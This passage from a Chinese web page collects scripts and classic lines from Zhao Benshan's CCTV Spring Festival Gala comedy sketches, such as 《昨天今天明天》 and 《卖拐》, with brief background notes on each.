头就着，呼呼的。</p><p><strong>白云</strong>：没心没肺的人睡眠质量都高。</p><p><strong>小崔</strong>：是啊，像我这小心眼儿的才睡不着呢。</p><p><strong>白云</strong>：没说你。</p><p><strong>小崔</strong>：啊，大叔啊，您这六年快乐吗？</p><p><strong>黑土</strong>：快乐！我天天唱二人转，跟十来个老娘们……（白云瞪黑土）</p><p><strong>白云</strong>：他搞他的民间艺术，我整我的出版物。生活上俺们互相关心，事业上互相帮助，怎么跟你形容呢……</p><p><strong>黑土</strong>：<font color="green">凑合过呗，还能离咋的？</font></p><p><strong>小崔</strong>：其实啊，我都听说了，大叔大妈感情上出了些问题。</p><p><strong>白云</strong>：<font color="green">绯闻，绝对的绯闻。没有新闻的领导不叫领导，没有绯闻的名人那算不得名人。做人难，做女人难……</font></p><p><strong>黑土</strong>：<font color="green">做一个名老女人……难。</font></p><p><strong>小崔</strong>：（对观众）大家都看到了吧，这大叔是一肚子实话说不出来啊，幸亏我还准备了一招。（对白云、黑土）哎，咱换个方式，大叔大妈。我问大叔的时候大妈把这耳机戴上，问大妈的时候呢，大叔把这耳机戴上。好不好?听听音乐，放松放松。</p><p><strong>白云</strong>：给他扣上。</p><p><strong>小崔</strong>：来，戴上。</p><p><strong>黑土</strong>：（戴上）哎呀呀（摘下），这声儿太大了！</p><p><strong>白云</strong>：叫你扣上你扣上，你咋那么多话呢？嘿嘿，问吧，崔。</p><p><strong>小崔</strong>：哎，大妈，你们这次到北京时怎么来的？</p><p><strong>白云</strong>：俺们……搭专机来的。</p><p><strong>小崔</strong>：那太贵了，那我们报不起。<font color="blue">（注：回应《昨天 今天 明天》中黑土地台词“来前的火车票谁给报了？”）</font></p><p><strong>白云</strong>：不用报，都小钱儿，现在，有钱，瞅这穿的，相当有钱，嘿，太有钱了……</p><p><strong>小崔</strong>：您这是貂皮！</p><p><strong>白云</strong>：错！貂绒。</p><p><strong>小崔</strong>：特别贵吧？</p><p><strong>白云</strong>：不贵，四万。</p><p><strong>小崔</strong>：四万还不贵啊？大妈真舍得给自己花钱！</p><p><strong>白云</strong>：<font color="green">女人嘛，对自己下手就要狠一点儿。</font></p><p><strong>小崔</strong>：那我再问问大叔？</p><p><strong>白云</strong>：行。</p><p><strong>小崔</strong>：您听听音乐。</p><p>（白云摘下黑土耳机戴上）</p><p><strong>白云</strong>：问你了，该你了。</p><p><strong>黑土</strong>：这声儿挺大的。</p><p><strong>小崔</strong>：大叔啊，听说你们这次到北京是搭专机来的？</p><p><strong>黑土</strong>：啊，是搭拉砖拖拉机过来的。</p><p><strong>小崔</strong>：那得多冷啊。</p><p><strong>黑土</strong>：穿得多啊，这都扛风，你看她这衣服。</p><p><strong>小崔</strong>：大妈这衣服挺贵的吧？</p><p><strong>黑土</strong>：老贵了！四十一天租的。</p><p><strong>小崔</strong>：租的？（对观众）怎么样？有效果吧？还得这么问。（对黑土）啊，我再问问大妈。您听听音乐。</p><p><strong>白云</strong>：这底下咋都笑呢？我看这里有事儿，你看我点儿手势。</p><p><strong>黑土</strong>：明白。</p><p><strong>白云</strong>：你问吧，崔。</p><p><strong>小崔</strong>：大妈，咱说说您这书吧。</p><p><strong>白云</strong>：书啊？</p><p><strong>小崔</strong>：嗯。</p><p><strong>白云</strong>：说书那可有的说了。那……从哪儿说起呢？（做手势）</p><p><strong>小崔</strong>：就从签字售书说起吧。</p><p><strong>白云</strong>：签字售书啊？</p><p><strong>小崔</strong>：啊。</p><p><strong>白云</strong>：<font color="green">签字售书那天那家伙那场面那是相当大呀！那真是：锣鼓喧天，鞭炮齐鸣，红旗招展，人山人海呀。</font>（做手势）那把我挤桌子底下去了，那一摞儿书都倒了。（蹲下）</p><p><strong>小崔</strong>：噢。那我再问问大叔？</p><p><strong>白云</strong>：行。问你，我那书、书。</p><p><strong>小崔</strong>：啊，大叔啊，大叔啊，大妈签字售书那天，您也在现场吧？</p><p><strong>黑土</strong>：没签字售书啊。</p><p><strong>小崔</strong>：没有吗？</p><p><strong>黑土</strong>：全白送的嘛！（重复白云的手势，以下均是）</p><p><strong>小崔</strong>：那，大妈刚才说“人山人海”？</p><p><strong>黑土</strong>：哎呀妈，一听说白送的全乡都去取书去了，回去全糊墙了，那家伙是左一层右一层，左一层右一层，（做手势）后来，上厕所一看，（蹲下）还有这么厚一摞儿书呢。（二老击掌）</p><p><strong>小崔</strong>：大妈，把耳机给我吧。</p><p><strong>白云</strong>：智商相当高。</p><p><strong>黑土</strong>：对。</p><p><strong>小崔</strong>：是这么回事啊，刚才呀，我问大叔大妈问的是同样的问题。</p><p><strong>白云</strong>：是！</p><p><strong>小崔</strong>：可是你们俩回答呀……</p><p><strong>白云</strong>：嗯。</p><p><strong>小崔</strong>：一点儿不一样。啊，我戴上耳机听听音乐，你们自己对一对啊。</p><p><strong>白云</strong>：不，怎么的，你怎么说的？咱怎么来的？</p><p><strong>黑土</strong>：坐拖拉机过来的。</p><p><strong>白云</strong>：我这衣服呢？</p><p><strong>黑土</strong>：四十一天租的。</p><p><strong>白云</strong>：我那书呢？</p><p><strong>黑土</strong>：我都按你那比划的，你不说全糊墙了吗，最后厕所还有看书啥的。</p><p><strong>白云</strong>：说了不让你啥实话都往外嘞，你咋记不住呢？</p><p><strong>黑土</strong>：那你没办法，他那玩意儿给扣住了。这孩子学坏了呢！我说他两句儿去。小崔呀。</p><p>（小崔摘耳机）</p><p><strong>黑土</strong>：你戴上。（竖拇指）你学坏了你呀，你这招儿太阴了！你不怪睡不着觉，心眼儿太多了你，该，啊！</p><p><strong>小崔</strong>：啊，谢谢啊！</p><p><strong>白云</strong>：他们主持人都这样儿！这么的吧，从现在开始你一声儿不许吱，一声儿都不吭，听见没，记住没？说话呀！</p><p><strong>黑土</strong>：你不不让说话吗！</p><p><strong>白云</strong>：跟你合作太难了，你说，这辈子没有过默契！崔呀，摘了吧。</p><p><strong>小崔</strong>：哎（摘耳机）。</p><p><strong>白云</strong>：咱接着唠。</p><p><strong>小崔</strong>：好！那我就，再问大叔一个问题。</p><p>（黑土向小崔示意不能说话）</p><p><strong>小崔</strong>：啊？</p><p><strong>白云</strong>：嗯？</p><p><strong>小崔</strong>：啊，怎么了大叔啊？（黑土捂着嘴）</p><p><strong>白云</strong>：啊，他胃疼。说你胃疼呢。</p><p>（黑土捂肚子）</p><p><strong>白云</strong>：这咋还下垂了呢？</p><p><strong>黑土</strong>：（捂着胃）胃在哪儿呢？</p><p><strong>小崔</strong>：啊呀，大妈您家教真严哪！您让大叔哪疼他就哪疼啊。</p><p><strong>白云</strong>：没有，他，身体不舒服，你问我呗。</p><p><strong>小崔</strong>：我刚才看了您这书啊，第一章，就叫《回家》。说的就是上次做完节目回铁岭的时候，那场面，特别壮观吧？</p><p><strong>白云</strong>：那怎么叫“特别”壮观呢？那是“相当”壮观哪！那家伙，那场面大的，那真是：锣鼓喧天，鞭炮齐鸣，红旗招展，人山人海，那……</p><p><strong>黑土</strong>：<font color="green">小崔我求求你，我把这玩意儿戴上吧！</font></p><p><strong>白云</strong>：（摘下耳机）我说的都是假的是不？</p><p><strong>黑土</strong>：真的。</p><p><strong>白云</strong>：你听不下去是不？</p><p><strong>黑土</strong>：能。</p><p><strong>白云</strong>：那你扣它干啥呀！</p><p><strong>黑土</strong>：胃疼。</p><p><strong>白云</strong>：咋这么烦人呢你说？崔，你接着问，啊。甭理他，没见过世面。</p><p><strong>小崔</strong>：我知道，其实大妈成了名人以后见世面挺多的，参加的活动很多吧？</p><p><strong>白云</strong>：那是“相当”多。一天到晚，俺们就是到处演出，四处演讲，还给人剪彩。</p><p><strong>小崔</strong>：出场费也不少吧？</p><p><strong>黑土</strong>：她八十，我四十。</p><p><strong>白云</strong>：<font color="green">都税后。</font></p><p><strong>小崔</strong>：那都给哪剪彩呀？</p><p><strong>白云</strong>：都是，大中型企业。</p><p><strong>黑土</strong>：大煎饼铺子、铁匠炉啥的。</p><p><strong>白云</strong>：啊……俺们那疙瘩有个挺老大个养鸡场，那都是我剪的。</p><p><strong>黑土</strong>：是，她剪完就禽流感了，第二天。当时，死了一万多只鸡，最后送她个外号，叫“一剪没（即一剪梅）”。</p><p><strong>白云</strong>：那不说话能憋死你不？能憋死你不！</p><p><strong>黑土</strong>：能憋疯。</p><p><strong>白云</strong>：怎么那么烦人呢你说你这人……</p><p><strong>黑土</strong>：说点儿实话……</p><p><strong>白云</strong>：我不稀得说你那些事儿就拉倒了你，给你留着面子。（向小崔）我不稀得说他！你说就他吧，就好给人出去唱歌，你这嗓子能唱吗？那天呢，就上俺们敬老院给人家唱去，笼共底下坐着七个老头儿，他“嗷”一嗓子喊出来，昏过去六个。</p><p><strong>小崔</strong>：那不还有一个呢吗？</p><p><strong>白云</strong>：还有一个是院长，拉着我手就不松开，那家伙可劲儿摇啊，“大姐呀，大哥这一嗓子太突然了，受不了哇，快让大哥回家吧，人家唱歌要钱，他唱歌要命啊！”</p><p><strong>黑土</strong>：你好！</p><p><strong>白云</strong>：怎么的。</p><p><strong>黑土</strong>：你得得瑟瑟还上精神病院给人讲演去了。</p><p><strong>白云</strong>：嗯。</p><p><strong>黑土</strong>：讲一天一宿。</p><p><strong>白云</strong>：怎么的，精神病都出院了。</p><p><strong>小崔</strong>：有效果。</p><p><strong>黑土</strong>：大夫疯了。</p><p><strong>白云</strong>：哪大夫疯了，我问你？</p><p><strong>黑土</strong>：崔大夫就疯了。</p><p><strong>白云</strong>：哪崔大夫！</p><p><strong>黑土</strong>：就小崔大夫。</p><p><strong>白云</strong>：怎么说话那么不负责任呢你说你……崔啊，千万别吃心，他没说你。说话这么……这老年痴呆呢，出门儿忘吃药了你。崔，咱接着唠，唠文学方面的，省着他插嘴。怎么那么烦人呢你说你……</p><p><strong>小崔</strong>：那，那大妈，咱就还说说您这书？</p><p><strong>白云</strong>：嗯。</p><p><strong>小崔</strong>：我听说您那个《月子Ⅱ》正在创作当中。</p><p><strong>白云</strong>：还有十万多字就截稿儿了。</p><p><strong>黑土</strong>：哎呀妈呀。</p><p><strong>白云</strong>：怎么的！</p><p><strong>黑土</strong>：胃疼。</p><p><strong>白云</strong>：忍着！（向小崔）你问！</p><p><strong>小崔</strong>：（吓一跳）哎哟！（书掉地上）</p><p><strong>白云</strong>：问吧，崔。你接着问。</p><p><strong>小崔</strong>：我听说，那个，读者特别期待？</p><p><strong>白云</strong>：<font color="green">怎么说“特别”期待呢？那是“相当”期待呀！那家伙，那，看完《月子I》就想看《月子Ⅱ》，都搁那憋着呢。</font></p><p><strong>黑土</strong>：<font color="green">那，这话是真的。那憋得是“相当”难受啊！那村长啊，就上俺家就堵着门儿就告诉你：“别让你媳妇儿她乱走了，赶紧写《月子Ⅱ》吧，村头厕所可没纸了。”</font></p><p><strong>白云</strong>：小崔，我恳请你们中央电视台封杀我，走了，不录了。</p><p><strong>小崔</strong>：哎，大妈怎么又走了？</p><p><strong>黑土</strong>：干啥呢？</p><p><strong>小崔</strong>：别吵，别吵，又走了？</p><p><strong>白云</strong>：你说干啥呀？你说我本来还想指着这节目再火一把呢，这家伙让你给扒得……都直播出去了，都看着呢！</p><p><strong>小崔</strong>：没事儿，这节目收视率低。</p><p><strong>白云</strong>：低也不行啊，我白云大小也是个名人儿，走了。</p><p><strong>黑土</strong>：走吧！得瑟什么玩意儿你？你白云什么名人儿，那就是个人名儿！你说你咋这样儿呢？你这就，录完一回“实话实说”，你咋这就把你祸害成这样呢，啊？咱就是农村小老头儿小老太太，咱写啥书啊？小学还没毕业呢就写书啊！你看这家七天憋出六个字儿。</p><p><strong>白云</strong>：怎的？</p><p><strong>黑土</strong>：都不爱说你，你就老老实实儿就得了呗。你这活得多累，你这样儿啊？你飘吧，你说不上哪天风大，把你这块儿云彩飘走了。</p><p><strong>白云</strong>：<font color="green">怎么的？你黑土有能耐也飘啊。</font></p><p><strong>黑土</strong>：<font color="green">我飘起来是沙尘暴。</font>你走吧，啊。崔啊，对不起噢。</p><p><strong>小崔</strong>：没事儿。</p><p><strong>黑土</strong>：<font color="green">你大妈已经不是你六年前那大妈了，你大爷永远是你大爷。</font></p><p><strong>小崔</strong>：怎么听着那么别扭？</p><p><strong>黑土</strong>：你别别扭。不剩最后一句了么，大爷给你录，好不好？你坐着吧，我说。</p><p><strong>白云</strong>：最后一句话我还想好了呢，还没说呢，我也说，怎么的？</p><p><strong>黑土</strong>：你不走吗？</p><p><strong>小崔</strong>：（对观众）哎呀，你看哪，本来这节目收视率就低，你说要把这播出去，那收视率“相当”高了就。（对白云、黑土）哎，大叔大妈呀，我们这节目改了，结尾它不是每人一句话了，它是才艺表演。你看，二人转这扇子我都给你们准备好了，一人一把，这是您的。</p><p><strong>白云</strong>：我不要，都给他！</p><p><strong>黑土</strong>：“作家”，不能要这玩意儿。</p><p><strong>小崔</strong>：才艺表演吗，您……您看我给你带个头儿，二人转的手绢儿。（鼓弄手绢）</p><p><strong>黑土</strong>：你这才艺表演擦玻璃呢？这玩意儿它也不应该是那么个事儿。它应该是这么回事儿，这就接住，你看。（表演手绢）</p><p><strong>小崔</strong>：嘿！</p><p><strong>黑土</strong>：你看看，看看。这玩意儿吧，撇出去，接回来。</p><p><strong>小崔</strong>：嘿，好。哎，咱欢迎大叔给咱来一段二人转好不好啊？</p><p><strong>黑土</strong>：我没带人儿。</p><p><strong>小崔</strong>：大妈在呢么。</p><p><strong>黑土</strong>：她不能唱。</p><p><strong>白云</strong>：也没人请我呀。</p><p><strong>小崔</strong>：请请。</p><p><strong>黑土</strong>：老蒯。（递扇子）</p><p><strong>白云</strong>：小样儿。</p><p><strong>黑土</strong>：你干啥去啊？</p><p><strong>白云</strong>：换衣服。</p><p>（表演二人转）</p><p><strong>黑土</strong>：老伴儿啊！</p><p><strong>白云</strong>：干啥？</p><p><strong>黑土</strong>：快来呀！</p><p><strong>白云</strong>：走着。</p><p>（唱）</p><p><strong>白云</strong>：正月里来春花儿开啊。</p><p><strong>黑土</strong>：白云黑土来到了电视台呀。</p><p><strong>白云</strong>：说起了以往的事儿，</p><p><strong>黑土</strong>：唠不到一块儿。</p><p><strong>白云</strong>：他说黑，我说白，</p><p><strong>黑土</strong>：她装相，我拆台呀。</p><p><strong>白云</strong>：当着小崔抹不开啊，</p><p><strong>黑土</strong>：实话不敢说出来呀。</p><p><strong>白云&amp;黑土</strong>：嘚儿啦喂哟咿儿哟啊。</p><p><strong>小崔</strong>：本来都挺实在的，</p><p><strong>黑土</strong>：为啥你出点小名儿，</p><p><strong>白云&amp;黑土</strong>：人就飘起来啊，嗯哎哎哎哟。</p><p><strong>白云</strong>：开水它不响，</p><p><strong>黑土</strong>：响水它没开呀。</p><p><strong>小崔</strong>：捅破了窗户纸把嗑儿唠明白。</p><p><strong>白云</strong>：本本分分，</p><p><strong>黑土</strong>：实实在在。</p><p><strong>白云</strong>：黑就是黑，</p><p><strong>黑土</strong>：白就是白。</p><p><strong>小崔</strong>：黑白不能倒过来呀。</p><p><strong>白云&amp;黑土</strong>：困了你就赶紧睡，睡好了你就醒过来吧。嘚儿啦喂哟咿儿哟啊，嘚儿啦喂哟咿儿哟啊。</p><p><strong>白云</strong>：祝愿大家，</p><p><strong>白云&amp;黑土</strong>：轻轻松松乐乐呵呵健健康康痛痛快快，奔向人生大舞台呀，嗯哎哎哎哟。</p></blockquote><hr><h1 id="2-昨天今天明天1999央视"><a class="markdownIt-Anchor" href="#2-昨天今天明天1999央视"></a> 2 《昨天今天明天》(1999央视)</h1><p>《昨天今天明天》是由<a href="https://baike.baidu.com/item/%E5%BC%A0%E6%83%A0%E4%B8%AD/33442" target="_blank" rel="noopener">张惠中</a>导演，<a href="https://baike.baidu.com/item/%E4%BD%95%E5%BA%86%E9%AD%81/5230744" target="_blank" rel="noopener">何庆魁</a>编剧，<a href="https://baike.baidu.com/item/%E8%B5%B5%E6%9C%AC%E5%B1%B1/131652" target="_blank" rel="noopener">赵本山</a>、<a href="https://baike.baidu.com/item/%E5%AE%8B%E4%B8%B9%E4%B8%B9/622454" target="_blank" rel="noopener">宋丹丹</a>、<a href="https://baike.baidu.com/item/%E5%B4%94%E6%B0%B8%E5%85%83/324929" target="_blank" rel="noopener">崔永元</a>表演的小品，于1999年2月15日在《<a href="https://baike.baidu.com/item/1999%E5%B9%B4%E4%B8%AD%E5%A4%AE%E7%94%B5%E8%A7%86%E5%8F%B0%E6%98%A5%E8%8A%82%E8%81%94%E6%AC%A2%E6%99%9A%E4%BC%9A/3877068" target="_blank" rel="noopener">1999年中央电视台春节联欢晚会</a>》上播出。</p><ul><li><a href="https://baike.baidu.com/item/%E6%98%A8%E5%A4%A9%E4%BB%8A%E5%A4%A9%E6%98%8E%E5%A4%A9/29326" target="_blank" rel="noopener">百度百科</a></li></ul><blockquote><p>宋丹丹： 我叫白云~</p><p>赵本山： 我叫黑土~</p><p>宋丹丹： 我七十一。</p><p>赵本山： 我七十五。</p><p>宋丹丹： 我属鸡。</p><p>赵本山： 我属虎。</p><p>宋丹丹： 这是我老公。</p><p>赵本山： 这是我老母—— （乐队奏乐）</p><p>赵本山： 我老伴儿。</p><p>宋丹丹： 差辈儿了~</p></blockquote><hr><blockquote><p>赵本山： 改革春风吹满地，中国人民真争气；齐心合力跨世纪，一场大水没咋地。谢谢！ （乐队奏乐）</p></blockquote><hr><blockquote><p>宋丹丹： 是~ 我站着说吧。改革春风吹进门，中国人民抖精神；海湾旮旯挺闹心，美英合伙欺负人。谢谢！</p><p>赵本山： 欺负人你谢它干啥玩意。</p><p>宋丹丹： 不礼貌么。</p></blockquote><hr><blockquote><p>赵本山： 你看着没，我搁家我就告诉她我说你写这段不行，海湾那事儿那联合国安南都管不了你操那心干啥玩意~</p></blockquote><hr><blockquote><p>赵本山： 大家好！九八九八不得了，粮食大丰收，洪水被赶跑。百姓安居乐业，齐夸党的领导。尤其人民军队，更是天下难找。国外比较乱套，成天勾心斗角。今天内阁下台，明天首相被炒。闹完金融危机，又要弹劾领导。纵观世界风云，风景这边更好！多谢！ （乐队奏乐）（赵本山坐在地上）</p></blockquote><hr><blockquote><p>宋丹丹： 俺们村人可喜欢你了，</p><p>崔永元： 真的啊？</p><p>宋丹丹： 都夸你呢，说你主持那节目可好了。</p><p>崔永元： 这么说的呀！</p><p>宋丹丹： 就是人长的磕碜点~（乐队奏乐）</p><p>赵本山： 你咋这样呢！</p><p>宋丹丹： 说实话么？</p><p>赵本山： 你瞎说啥实话。 对不起，她那不是这个意思，我老伴说那意思是都喜欢你主持那节目，哎呀，全村最爱看呐，那家伙说你主持的有特点，说一笑像哭似的。 （乐队奏乐）</p><p>赵本山： 不是，一哭像笑似的~</p></blockquote><hr><blockquote><p>赵本山： 这叫鞋拔子脸那？这是正宗的猪腰子脸！ （乐队奏乐）</p></blockquote><hr><blockquote><p>宋丹丹： 我年轻的时候那绝对不是吹——柳叶弯眉樱桃口，谁见了我都乐意瞅。俺们隔壁那吴老二，瞅我一眼就浑身发抖！</p><p>赵本山： 哼， 拉倒吧！吴老二脑血栓，看谁都哆嗦！</p></blockquote><hr><blockquote><p>宋丹丹： 现在不行了，现在是头发也变白了，皱纹也增长了，两颗洁白的门牙去年也光荣下岗了~</p></blockquote><hr><blockquote><p>宋丹丹： 秋波是啥完应你咋都不懂呢这么没文化呢！</p><p>赵本山： 啥呀？</p><p>宋丹丹： 秋波就是秋天的菠菜。</p></blockquote><hr><blockquote><p>宋丹丹： 俺俩搞对象那前儿吧，我就想送他件毛衣，那前儿穷，没钱买；赶上呢我正好给生产队放羊，我就发现那羊脱毛，我就往下薅（拔）羊毛。晚上回家呢，纺成毛线，白天一边织毛衣，一边放羊，一边再薅（拔）羊毛。结果眼瞅着织着差俩袖了让生产队发现了，不但没收了毛衣，还开批斗会批斗我，那茬儿不是有个罪名叫——</p><p>崔永元： 挖社会主义墙角！</p><p>宋丹丹： 是，给我定的罪名就叫薅社会主义羊毛。 （乐队奏乐）</p></blockquote><hr><blockquote><p>赵本山： 她心眼儿太实，你说当时放了五十只羊，你薅羊毛偏可一个薅（拔），薅（拔）的这家伙像葛优似的谁看不出来呀？</p></blockquote><hr><blockquote><p>宋丹丹： 说出来都不怕大伙笑话，他家穷的管啥完应没有。</p><p>赵本山： 别巴瞎，当时还有一样家用电器呢！</p><p>崔永元： 还有家用电器呀？</p><p>赵本山： 手电筒么！</p></blockquote><hr><blockquote><p>赵本山： 改革开放富起来之后，我们俩盖起了二层小楼。这楼盖完了屋多了突然跟我提出来要分居，说搁一个屋睡耽误她学外语，完事呢说这个感情这个东西是距离产生美。结果我这一上楼，距离拉开了，美没了！天天吃饭啥的也不正经叫我了，打电话，还说外语“Hello哇，饭已OK了，下来咪西吧！” （乐队奏乐）</p></blockquote><hr><blockquote><p>宋丹丹： 小崔，这咕噜掐了噢，别播。</p></blockquote><hr><blockquote><p>赵本山： 嗯，后来经过全家人的举手表决，大家一致认为我……</p><p>崔永元： 您是对的！</p><p>赵本山： 给人赔礼道歉。</p></blockquote><hr><blockquote><p>宋丹丹： “啊，白云，黑土向你道歉，来到你门前，请你睁开眼，看我多可怜。今天的你我怎样重复昨天的故事，我这张旧船票还能否登上你的破船？” （乐队奏乐）</p><p>崔永元： 大叔啊，后来怎么样了？</p><p>赵本山：涛声依旧了……（乐队奏乐）</p></blockquote><hr><blockquote><p>宋丹丹： 我都畅想好了，我是生在旧社会，长在红旗下，走在春风里，准备跨世纪。想过去，看今朝，我此起彼伏。于是乎我冒出个想法。</p><p>崔永元： 什么想法？</p><p>宋丹丹： 我想写本书。</p><p>赵本山： 哎呀，打住。拉倒吧，看书都看不下来写啥书啊！</p></blockquote><hr><blockquote><p>赵本山： 我觉着我们俩现在生活好了，越来越老了，余下的时间也越来越少了。过去论天儿过，现在就应该论秒了，下一步我准备领她出去旅游，走一走比较大的城市。</p><p>崔永元： 好想法。</p><p>赵本山： 去趟铁岭，度度蜜月。</p></blockquote><hr><blockquote><p>宋丹丹： 我就寻思度蜜月之前我得先美美容，把这俩门牙装上，装个烤瓷的。</p><p>崔永元： 高级的。</p><p>宋丹丹： 嗯，然后在整整容，做个拉皮儿。</p><p>赵本山： 我拍个黄瓜。</p><p>崔永元： 您要是弄个拉皮儿，拍个黄瓜，我就只能烫壶酒了。说着说着下酒菜都出来了。其实我听得出来，大叔大妈呀，是想永远年轻，那就让我们一起祝大叔大妈永远年轻，生活幸福！ （乐队奏乐）</p></blockquote><hr><blockquote><p>赵本山： 来前儿的火车票谁给报了。你说这个。（乐队奏乐）</p></blockquote><hr><h1 id="3-卖拐2001央视"><a class="markdownIt-Anchor" href="#3-卖拐2001央视"></a> 3 《卖拐》(2001央视)</h1><p>《卖拐》是由<a href="https://baike.baidu.com/item/%E5%B0%B9%E5%85%B4%E5%86%9B/7711126" target="_blank" rel="noopener">尹兴军</a>编剧并执导，<a href="https://baike.baidu.com/item/%E8%B5%B5%E6%9C%AC%E5%B1%B1/131652" target="_blank" rel="noopener">赵本山</a>、<a href="https://baike.baidu.com/item/%E8%8C%83%E4%BC%9F/10184" target="_blank" rel="noopener">范伟</a>、<a href="https://baike.baidu.com/item/%E9%AB%98%E7%A7%80%E6%95%8F/1477886" target="_blank" rel="noopener">高秀敏</a>主演的小品，于2001年1月23日《<a href="https://baike.baidu.com/item/2001%E5%B9%B4%E4%B8%AD%E5%A4%AE%E7%94%B5%E8%A7%86%E5%8F%B0%E6%98%A5%E8%8A%82%E8%81%94%E6%AC%A2%E6%99%9A%E4%BC%9A/6143416" target="_blank" rel="noopener">2001年中央电视台春节联欢晚会</a>》上播出 。该小品讲述了<a href="https://baike.baidu.com/item/%E5%A4%A7%E5%BF%BD%E6%82%A0/8494585" target="_blank" rel="noopener">大忽悠</a>“赵本山”通过高超的“<a href="https://baike.baidu.com/item/%E5%BF%BD%E6%82%A0/130888" target="_blank" rel="noopener">忽悠</a>”手段把双拐卖给了一个双腿健康的陌生人的故事 [2] 。</p><ul><li><a href="https://baike.baidu.com/item/%E5%8D%96%E6%8B%90" target="_blank" rel="noopener">百度百科</a></li></ul><blockquote><p>赵本山：脑袋大，脖子粗，不是大款就伙夫！——是不？是厨师不？</p></blockquote><hr><blockquote><p>赵本山：对了，这不是主要病症！你知道你的脸为什么大吗？</p><p>范伟：为啥？</p><p>赵本山：是你的末梢神经坏死把上边憋大了。</p></blockquote><hr><blockquote><p>赵本山：走两步！走两步！没病走两步！你想看病吗，看病就走两步！</p></blockquote><hr><blockquote><p>赵本山：停！麻没？</p><p>范伟：麻了</p><p>高秀敏：他咋麻了呢？</p><p>赵本山：你跺，你也麻！</p></blockquote><hr><blockquote><p>赵本山：要什么自行车呀？要啥自行车？</p></blockquote><hr><h1 id="4-卖车2002央视"><a class="markdownIt-Anchor" href="#4-卖车2002央视"></a> 4 《卖车》(2002央视)</h1><p>《卖车》是由马丽娟导演，何庆魁、宫凯波编剧，赵本山、范伟和高秀敏表演的小品，该小品于2002年2月11日在《2002年中央电视台春节联欢晚会》上播出。<br>该小品是作品《卖拐》的续集，讲述了吃一堑长一智的范厨师再次遇到“大忽悠”夫妇，但最终还是招架不住“大忽悠”的忽悠，又上当受骗的故事。<br>2002年2月26日，该小品获得2002年中央电视台“我最喜爱的春节联欢晚会节目”评选小品类一等奖的奖项。</p><ul><li><a href="https://baike.baidu.com/item/%E5%8D%96%E8%BD%A6/4602064" target="_blank" rel="noopener">百度百科</a></li></ul><blockquote><p>大忽悠： 我说他完了！媳妇儿，看见没有，变化多大这一年？往上看。</p><p>大忽悠媳妇： 要说有变化，那脑袋比去年更大了。</p><p>大忽悠： 对了！连我媳妇都看出来了。知道因为啥吗？由于你一年没有坚持拄拐，你的病毒往上转移，已经到了大脑，你两条腿有两根大筋，好比是两条高速公路，病毒以每小时一百八十公里的速度向上飞速前进，现在你完了，无情的病毒正在吞噬着你的大脑健康细胞，一个崭新的植物人即将诞生！</p></blockquote><hr><blockquote><p>大忽悠媳妇：看着比去年欢实多了哈！</p></blockquote><hr><blockquote><p>大忽悠： 这样的？好，我给你出一个三岁小孩的脑筋急转弯，</p><p>范厨师： 你别整三岁的，有能耐你整四岁的。</p><p>大忽悠： 四岁的你行么？</p><p>范厨师： 五岁都不在乎！</p><p>大忽悠： 你看看，他只在这个年龄段混了，咱还怕他干啥。做准备，请听第一题。</p></blockquote><hr><h1 id="5-功夫2005央视"><a class="markdownIt-Anchor" href="#5-功夫2005央视"></a> 5 《功夫》(2005央视)</h1><p>《功夫》是由张惠中执导，张猛、宫凯波编剧，赵本山、范伟、蔡维利、王小虎表演的小品，于2005年2月8日在《2005年中央电视台春节联欢晚会》中首播。<br>该小品是“忽悠”系列的最后一部，讲述了“大忽悠”带着两个徒弟来到“防忽悠热线咨询公司”，想方设法忽悠范厨师但最终被戳穿的故事。<br>2005年2月，该小品获得2005年中央电视台“我最喜爱的央视春晚节目”评选小品类一等奖的奖项。</p><ul><li><a href="https://baike.baidu.com/item/%E5%8A%9F%E5%A4%AB/5607660" target="_blank" rel="noopener">百度百科</a></li></ul><blockquote><p>大忽悠：我是……有一个问题想直接咨询你老一下。<br>范厨师：啊，你说！<br>大忽悠：我们家有头老母猪啊，黑底儿白花的，早晨起来打开圈门以每小时80迈的速度向前疯跑，咣当撞树上死了！<br>范厨师：撞死了？这个猪的视力是不是有什么问题啊？<br>大忽悠：俩眼睛都是1.5的！<br>范厨师：会不会有什么心理疾病啊？<br>大忽悠：心理可健康了呢！<br>范厨师：那怎么会撞死呢？<br>大忽悠：那头猪不会脑筋急转弯呗！</p></blockquote><hr><blockquote><p>范厨师：过年了，我们家什么年货也没买，就剩下一头猪和一头驴，你说我是先杀猪呢，还是先杀驴呢？<br>大忽悠：那你先杀……给你们俩个机会！<br>小忽悠甲：驴肉好吃！先杀驴！<br>大忽悠：先杀驴！<br>范厨师：恭喜你答对啦，猪也是这么想的！<br>大忽悠：喂喂……<br>范厨师：小样儿，哼！哎呀！<br>大忽悠：悲哀，真让我替你感到悲哀，眼看就要独闯江湖了，这怎么能让我放心得下？<br>小忽悠乙：师父，先杀猪好了！<br>大忽悠：那驴也是那么想的！我告诉你，就这个问题你先杀谁都不好使！我为什么没回答呢，就因为我考虑他是有问题的！诶呀，看见没？他已经从当年的一根筋，现在成长到两头堵了！</p></blockquote><hr><blockquote><p><strong>范厨师</strong>：诶，哪位？请问你们咨询……诶呀，诶呀，诶呀呀呀呀呀呀呀……，这是什么造型啊，挺别致啊，非常六加七啊，这当年叱咤风云的大忽悠，怎么落到这步田地了，苍天啊，大地啊，这是哪位天使大姐替我出的这口气啊！猪撞树上了，你撞猪上了吧，追尾是不是啊！咋又改三了呢？</p></blockquote><hr><blockquote><p><strong>大忽悠</strong>：诶呀吗呀，呀呀呀呀……！这个世界太疯狂了，耗子都给猫当伴娘了！我的妈呀！</p></blockquote><hr><blockquote><p><strong>范厨师</strong>：过年啦，送你一副对联，拐一年摇一年缘分啊，吃一堑长一智谢谢啊！</p><p><strong>大忽悠</strong>：我再给你补个横批吧，自学成才！</p></blockquote><h1 id="6捐助2010央视"><a class="markdownIt-Anchor" href="#6捐助2010央视"></a> 6《捐助》(2010央视)</h1><p>《捐助》是由<a href="https://baike.baidu.com/item/%E9%AB%98%E5%A4%A7%E5%AE%BD/5763213" target="_blank" rel="noopener">高大宽</a>导演，<a href="https://baike.baidu.com/item/%E5%B0%B9%E7%90%AA/938459" target="_blank" rel="noopener">尹琪</a>、<a href="https://baike.baidu.com/item/%E4%BD%95%E5%BA%86%E9%AD%81/5230744" target="_blank" rel="noopener">何庆魁</a>编剧，<a href="https://baike.baidu.com/item/%E8%B5%B5%E6%9C%AC%E5%B1%B1/131652" target="_blank" rel="noopener">赵本山</a>、<a href="https://baike.baidu.com/item/%E5%B0%8F%E6%B2%88%E9%98%B3/10743561" target="_blank" 